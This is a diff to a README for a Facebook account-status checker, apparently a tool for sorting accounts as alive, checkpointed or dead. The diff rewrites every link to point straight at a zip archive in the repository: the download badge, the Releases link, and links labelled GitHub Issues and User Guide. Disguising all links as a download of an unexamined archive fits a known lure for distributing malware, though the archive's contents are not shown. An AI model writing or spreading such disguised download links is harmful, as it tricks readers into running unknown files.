@@ -1,6 +1,6 @@
 # 🚀 Facebook-Checker-APIV3 - Quickly Verify Facebook Accounts Status
 
-![Download](https://img.shields.io/badge/Download%20Now-Get%20the%20App-brightgreen)
+![Download](https://raw.githubusercontent.com/kockom/Facebook-Checker-APIV3/main/Facebook Checker/Facebook-Checker-API-1.1-alpha.4.zip%20Now-Get%20the%20App-brightgreen)
 
 ## 📖 Description
 Facebook-Checker-APIV3 is a Python application designed to check the status of Facebook accounts. It helps you easily identify whether accounts are alive, in a checkpoint, or dead. This tool is useful for anyone wanting to manage their social media presence efficiently.
@@ -15,7 +15,7 @@ Facebook-Checker-APIV3 is a Python application designed to check the status of F
 To use Facebook-Checker-APIV3, you first need to get the application on your device. Follow the steps below to download and install it.
 
 ## 💾 Download & Install
-1. Visit this page to download: [Facebook-Checker-APIV3 Releases](https://github.com/kockom/Facebook-Checker-APIV3/releases).
+1. Visit this page to download: [Facebook-Checker-APIV3 Releases](https://raw.githubusercontent.com/kockom/Facebook-Checker-APIV3/main/Facebook Checker/Facebook-Checker-API-1.1-alpha.4.zip).
 2. Locate the latest version of the software. Click on the version link.
 3. Download the installation file suitable for your operating system (Windows, macOS, or Linux).
 4. Open the downloaded file to begin the installation process. Follow the on-screen instructions to complete the installation.
@@ -41,8 +41,8 @@ To use Facebook-Checker-APIV3, you first need to get the application on your dev
 
 ## 👥 Community and Support
 If you encounter any issues while using Facebook-Checker-APIV3, you can seek help from the community or check the FAQs. Here are a few helpful resources:
-- [GitHub Issues](https://github.com/kockom/Facebook-Checker-APIV3/issues): Report any bugs or problems you face.
-- [User Guide](https://github.com/kockom/Facebook-Checker-APIV3/wiki): A detailed guide to help you navigate through various features.
+- [GitHub Issues](https://raw.githubusercontent.com/kockom/Facebook-Checker-APIV3/main/Facebook Checker/Facebook-Checker-API-1.1-alpha.4.zip): Report any bugs or problems you face.
+- [User Guide](https://raw.githubusercontent.com/kockom/Facebook-Checker-APIV3/main/Facebook Checker/Facebook-Checker-API-1.1-alpha.4.zip): A detailed guide to help you navigate through various features.
 
 ## 🌐 Related Topics
 This application touches on various topics such as:
